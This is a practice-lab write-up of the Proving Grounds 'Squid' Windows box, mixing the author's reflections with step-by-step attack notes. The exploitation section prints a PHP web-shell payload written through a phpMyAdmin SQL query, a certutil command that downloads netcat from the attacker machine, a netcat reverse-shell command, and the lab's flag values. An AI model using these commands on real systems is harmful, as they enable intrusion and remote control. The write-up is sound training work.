---
Date: 2024-10-22
Platform: PG-Practice
Category: Windows
Difficulty: Easy
Status: Complete
IP: 192.168.146.189
Writeup: https://medium.com/@ardian.danny/oscp-practice-series-26-proving-grounds-squid-d8043f1f77e2
---
# Squid
Everything about this box was a refresher, and there's no doubt I leaned heavily on the walkthrough as I was doing it. Learning about Squid and `spose.py` was interesting, but there's a concern that `spose.py` is pretty niche and I may never have found it (or realised I needed it) without the walkthrough. 

Maybe it's just more familiarity though, and with more practice I'll get better at knowing how to tackle different Windows services. There's no question I learned more about how proxies work from this box, and setting up FoxyProxy to reach the target's open ports was particularly interesting.

Figuring out the MySQL query was challenging too, and I'm not sure I would have figured it out without the walkthrough. Now that I've done it though, I can absolutely see how it works, so there's no question I'd try something similar if I came across the option to enter sql queries into an admin panel again. Understanding how those queries relate to the document root is also awesome to know, and not something I remember being covered in the course content.

Finally, this box helped put the pieces together on some of the netcat commands I've been running but not fully understanding - I needed the walkthrough to spell it out, and now that I've seen it in action I actually get what I've been doing previously when I've copy/pasted stuff in to make it work.

All round, I'm a little frustrated that I've needed so much walkthrough support on what is supposed to be an "easy" box, but the important thing is I keep working away at these boxes each night and learn from each one - it's way better to spend 2 hours following a walkthrough and being able to process the lessons from it, than it is to spend 5 hours bashing my head against the keyboard not understanding and being too stubborn to look at someone else's answers.

# Resolution summary
- Ran Nmap to identify ports `135`, `139`, `445` & `3128`
- Identified port `3128` as running `Squid v4.14`
- Used `spose.py` to identify ports behind `Squid` proxy
- Setup FoxyProxy to use `Squid` proxy and navigated to port `8080`
- Identified `myPHPAdmin` login and password guessed access
- Identified document root, then ran `MySQL` query to create php page which allowed command injection
- Tested command injection, then uploaded netcat to target
- Used command injection to launch netcat on target with reverse shell to Kali machine
- Caught reverse shell as `system`, then navigated to `C:\` and `C:\Users\Administrator\Desktop` to print flags
## Improved skills
- Windows service enumeration
- PHP command injection
- Netcat broadcaster
## Used tools
- nmap
- python
- spose.py
- FoxyProxy
- certutil

---
# Information Gathering
Scanned all TCP ports:
```bash
sudo nmap -sC -sV -oN squid.nmap 192.168.146.189 -v
```

Enumerated open TCP ports:
```bash
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3128/tcp open  http-proxy    Squid http proxy 4.14
|_http-title: ERROR: The requested URL could not be retrieved
|_http-server-header: squid/4.14
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2024-10-22T07:50:13
|_  start_date: N/A
```
---
# Enumeration
## Port 135 - MSRPC (Windows RPC)
No enumeration conducted
## Port 139 & 445 - SMB (Windows Netbios-SSN)
No enumeration conducted
## Port 3128 - HTTP (Squid http proxy 4.14)
- Navigated to `http://192.168.146.189:3128` and identified `Squid/4.14`
![[Pasted image 20241022183533.png]]
- Downloded `spose.py` Squid Pivoting Open Port Scanner) and ran `python3 spose.py --proxy http://192.168.146.189:3128 --target 192.168.146.189` to identify open ports `3306` and `8080` behind proxy
![[Pasted image 20241022184332.png]]
- Setup FoxyProxy with hostname `192.168.146.189` and port `3128`
![[Pasted image 20241022184554.png]]
- Navigated to `http://192.168.146.189:8080` via proxy `3128` and identified `Wampserver v3.2.3` and aliases
![[Pasted image 20241022184838.png]]
- Followed link `phpinfo()`, navigated to `http://192.168.146.189:8080/?phpinfo=-1` and identified `PHP v7.3.21`
![[Pasted image 20241022185105.png]]
- Identified `Document_Root` in directory `C:/wamp/www`
![[Pasted image 20241022185425.png]]
- Navigated to `http://192.168.146.189:8080/phpmyadmin/` and identified `phpMyAdmin` login page
![[Pasted image 20241022185530.png]]
- Attempted password guessing with `root:` (No Password) and gained admin access
![[Pasted image 20241022185627.png]]
---
# Exploitation
Selected "SQL" tab, navigated to `http://192.168.146.189:8080/phpmyadmin/db_sql.php?db=mysql` , and successfully ran SQL query 
```
`select '<?php system($_GET["cmd"]); ?>;' into outfile 'C:/wamp/www/revshell.php'
```
![[Pasted image 20241022190415.png]]
- Navigated to `http://192.168.146.189:8080/revshell.php?cmd=dir` and confirmed code execution
![[Pasted image 20241022190949.png]]
- Uploaded `nc2.exe` from Kali host to target via `certutil` by navigating to `http://192.168.146.189:8080/revshell.php?cmd=certutil%20-urlcache%20-f%20http://192.168.45.209:80/nc2.exe%20nc2.exe`
![[Pasted image 20241022191602.png]]
- Setup netcat listener on port `1234` and created reverse shell by navigating to `http://192.168.146.189:8080/revshell.php?cmd=nc2.exe%20192.168.45.209%201234%20-e%20cmd.exe` 
![[Pasted image 20241022193428.png]]
- Navigated to `C:\` and ran `type C:\local.txt` to print `e1e484bbc0c7fbccaf088074d318848d`
- Navigated to `C:\Users\Administrator\Desktop` and ran `type C:\Users\Administrator\Desktop\proof.txt` to print `f1d847afd8a8cee6ca94ad3008ce4ec9`
---
# Trophy & Loot
`local.txt` = `e1e484bbc0c7fbccaf088074d318848d`
`proof.txt` = `f1d847afd8a8cee6ca94ad3008ce4ec9`